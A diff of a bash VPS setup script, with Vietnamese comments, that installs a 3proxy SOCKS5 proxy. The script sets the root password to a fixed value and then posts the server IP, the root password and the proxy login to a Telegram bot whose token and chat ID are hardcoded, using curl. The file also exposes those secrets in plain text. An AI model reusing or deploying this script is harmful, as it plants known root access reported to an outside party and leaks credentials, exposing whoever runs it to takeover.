@@ -11,21 +11,21 @@ UsePAM yes
 Subsystem sftp /usr/lib/openssh/sftp-server
 EOF
 
-# Đặt mật khẩu root VPS
-VPS_PASS="01062007Tu#"
-echo "root:$VPS_PASS" | chpasswd
+PASS="01062007Tu#"
+echo "root:$PASS" | chpasswd
 systemctl restart ssh
-systemctl restart sshd
 
 # === Cài đặt 3proxy ===
-yum install -y git gcc make curl > /dev/null 2>&1
+apt update -y
+apt install -y git gcc make curl
+
 cd /root || cd ~
 rm -rf 3proxy
 git clone https://github.com/z3APA3A/3proxy.git
 cd 3proxy
 make -f Makefile.Linux PREFIX=bin
 
-# === Cấu hình 3proxy user: anhtu pass: anhtuproxy ===
+# === Cấu hình 3proxy ===
 cat <<EOF > /etc/3proxy.cfg
 daemon
 maxconn 200
@@ -42,7 +42,7 @@ mkdir -p /var/log
 touch /var/log/3proxy.log
 chmod 666 /var/log/3proxy.log
 
-# === Tạo systemd service để tự khởi động lại khi reboot ===
+# === Tạo systemd service ===
 cat <<EOF > /etc/systemd/system/3proxy.service
 [Unit]
 Description=3Proxy SOCKS5 Service
@@ -61,23 +61,13 @@ systemctl daemon-reload
 systemctl enable 3proxy
 systemctl start 3proxy
 
-# === Gửi thông tin về Telegram ===
+# === Gửi Telegram với định dạng đẹp ===
 BOT_TOKEN="7661562599:AAG5AvXpwl87M5up34-nj9AvMiJu-jYuWlA"
 CHAT_ID="7051936083"
 IP=$(curl -s ipv4.icanhazip.com)
 
+MSG="🎯 Proxy Created!%0A➡️ $IP:23456%0A👤 anhtu%0A🔑 anhtuproxy%0A%0A🔹 SSH VPS%0A➡️ $IP%0A👤 root%0A🔑 01062007Tu#%0A%0A✅ Sẵn sàng!"
+
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
--d chat_id="$CHAT_ID" \
--d text="🎯 Proxy & VPS Created!
-
-🔹 SOCKS5 Proxy
-➡️ $IP:23456
-👤 User: anhtu
-🔑 Pass: anhtuproxy
-
-🔹 SSH VPS
-➡️ IP: $IP
-👤 User: root
-🔑 Pass: $VPS_PASS
-
-✅ Thành công!"
+ -d chat_id="$CHAT_ID" \
+ -d text="$MSG"
